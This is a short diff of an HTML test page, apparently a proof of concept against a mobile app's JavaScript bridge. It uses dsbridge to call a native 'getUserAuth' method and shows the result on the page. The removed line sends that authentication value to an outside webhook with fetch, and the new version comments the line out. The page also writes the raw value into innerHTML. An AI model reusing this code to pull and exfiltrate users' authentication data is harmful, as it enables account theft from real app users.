@@ -30,8 +30,12 @@
     
             db.call("getUserAuth", function (value) {
                 // alert(value)
-                document.getElementById("batata").innerHTML = value
-                fetch(webhook + "?data=" + value, { mode: "no-cors" })
+
+                // const js = JSON.parse(value)
+                const st = String(value)
+
+                document.getElementById("batata").innerHTML = st
+                // fetch(webhook + "?data=" + value, { mode: "no-cors" })
     
             })
         })
@@ -44,7 +48,7 @@
 <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
 
 <body>
-    <h1>Teste 9</h1>
+    <h1>Teste 10</h1>
     <br>
     <h2 id="batata">batata</h2>
 </body>
